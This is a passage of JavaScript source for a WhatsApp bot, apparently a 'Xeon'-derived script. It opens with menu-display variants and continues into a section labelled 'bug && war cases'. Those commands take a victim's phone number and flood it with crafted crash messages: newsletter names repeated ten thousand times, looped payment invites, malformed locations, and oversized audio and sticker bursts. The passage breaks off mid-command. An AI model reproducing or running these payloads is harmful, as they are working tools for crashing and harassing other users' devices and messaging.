   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${convertmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'bugmenu': {
		if (isBan) return reply(mess.ban) 
	if (!isRegistered) return reply(mess.daftar)
let xmenu_oh = `Hi ${pushname} ${xeonytimewisher}\n\
▧ 「 *I N F O  U S E R* 」

   ☍ *Name:* ${pushname}
   ☍ *Number:* ${m.sender.split('@')[0]}
   ☍ *Status:* ${YasamCreator ? "Owner 🥶" : "User ⭐"}
   ☍ *User:* ${isPremium ? 'Premium 🥶' : 'Gratisan ⭐'}
   ☍ *Limit:* ${!YasamCreator ? 'Unlimited 🥶' : `${db.data.users[m.sender].limit}⭐`}
${cmenut} ${readmore}\n\n${bugmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                Yasam.sendMessage(m.chat, {
                    text: xmenu_oh,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fvrif
                })                
                } else if (typemenu === 'v2') {
                    Yasam.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fvrif
                    })
                }   if (typemenu === 'v3') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v4') {
                    Yasam.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: fvrif
                    })
                } else if (typemenu === 'v5') {
                    Yasam.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    Yasam.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    Yasam.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	Yasam.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/kta439.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: fvrif
                    })
                    } else if (typemenu === 'v9') {
                	Yasam.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://files.catbox.moe/9fok4g.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: fvrif
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, {})
      
      await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: Yasam.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"MENU 🌺",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"YouTube 🌹\",\"url\":\"https://youtube.com/@DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"Telegram 💧\",\"url\":\"https://t.me/Yasam\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"GitHub 🔘\",\"url\":\"https://github.com/DGXeon\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, {})

await Yasam.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
            case 'checkaccount':
            case 'account': {
               let a = db.data.users[sender]
               let b = `Below is your account information\n`
               b += `================================\n`
               b += `Serial Code:\n*[${a.serialNumber}]*\n`
               b += `Title: ${a.title}\n`
               b += `Afk Time: ${a.afkTime}\n`
               b += `Afk Reason: ${a.afkReason}\n` 
               b += `Nickname: ${a.nick}\n`
               b += `Premium Status: ${a.premium}\n`
               b += `Your Limit: ${a.limit}\n`
               b += `================================`
               Yasam.sendMessage(sender, { text: b }, { quoted: fvrif })
               replygcxeon('Account Details Has Been Sent In Private Chat')
            }
            break
            case 'limit':
            case 'checklimit': {
               let a = db.data.users[sender]
               let b = `Your Limit ${a.limit}\n` 
               b += `Premium Status ${isPremium ? 'On' : 'Off' }\n` 
               b += `Serial Code:\n*[${a.serialNumber}]*\n`
               replygcxeon(b)
            }
            break
            
            //bug && war cases 
//⚠️do not edit cases otherwise bug not work
//bug cases 
case 'clearchat':
m.reply('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
case 'xreact': {
if (!isPremium) return replygcxeon(mess.prem)
if (!m.quoted) return replygcxeon(`Example usage: ${prefix + command} reply chat`)
await Yasam.sendMessage(m.chat, { text: 'Success In Sending Bug', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `${ownername}`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
await Yasam.sendMessage(m.chat, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break
case 'x2': {
if (!isPremium) return replygcxeon(mess.prem)
if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`) 
amount = text * 30
for (let i = 0; i < amount; i++) {
await Yasam.sendMessage(m.chat, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
}
}
break
case 'x': {
if (!isPremium) return replygcxeon(mess.prem)
if (!args[0]) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx|5`) 
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await Yasam.sendMessage(victim, { text: ownername, contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: botname.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
}
replygcxeon(`Successfully Sent Bug To ${victim}`)
}
break
case 'iosbug2': {
if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Example usage: ${prefix + command} 5`)
amount = text * 30
for (let i = 0; i < amount; i++) {
await Yasam.relayMessage(m.chat, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
}
break
case 'iosbug': {
if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Example:\n ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await Yasam.relayMessage(victim, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(1400)
}
replygcxeon(`Successfully Sent Bug To ${victim}`)
}
break
case 'xaudio2': {
if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Example usage: ${prefix + command} 5`)
amount = text * 30
for (let i = 0; i < amount; i++) {
await Yasam.sendMessage(m.chat, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
}
}
break
case 'xaudio': {
if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Example usage:\n ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await Yasam.sendMessage(victim, { "caption": `${ownername}`, audio: wkwk, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: botname.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
}
replygcxeon(`Successfully Sent Bug To ${victim}`)
}
break
case 'xsticker': {
if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Example: ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await Yasam.sendVideoAsSticker(victim, xsteek, xbug2, { packname: packname, author: author })
}
replygcxeon(`Successfully Sent Bug To ${victim}`)
}
break
case 'xsticker2': {
if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Example: ${prefix + command} 5`)
amount = text * 2
for (let i = 0; i < amount; i++) {
await Yasam.sendVideoAsSticker(m.chat, xsteek, xbug2, { packname: packname, author: author })
}
}
break
case 'xloc2': {
if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Example: ${prefix + command} 5`)
amount = text
XeonOP = ownername.repeat(0)
for (let i = 0; i < amount; i++) {
Yasam.sendMessage(from, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: `https://${XeonOP}.com`, comment: botname, jpegThumbnail: null } }, { quoted: xbug2 })
}
}
break
case 'xloc': {
if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Example: ${prefix + command} 91xxxxxxxxxx|5`)
await loading()
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
XeonOP = ownername.repeat(0)
for (let i = 0; i < amount; i++) {
Yasam.sendMessage(victim, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: botname, address: ownername, url: `https://${XeonOP}.com`, comment: botname, jpegThumbnail: null } }, { quoted: xbug2 })
}
replygcxeon(`Successfully Sent Bug To ${victim}`)
}
break
case 'xlist': {
if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Example:\n${prefix + command} 91xxxxxxxxxx|5`)
victim = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1] * 30
for (let i = 0; i < amount; i++) {
await Yasam.sendMessage(victim, { text: '' }, { quoted: xbug2 })
}
replygcxeon(`Successfully Sent Bug To ${victim}`)
}
break
case 'xlist2': {
if (!isPremium) return replygcxeon(mess.prem)
if (!text) return replygcxeon(`Example:\n${prefix + command} 5`)
amount = text * 30
for (let i = 0; i < amount; i++) {
await Yasam.sendMessage(from, { text: '' }, { quoted: xbug2 })
}
}
break
case 'xkill2': {
if (!isPremium) return replygcxeon(mess.prem)
 if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 13`) 
let amount = text*10
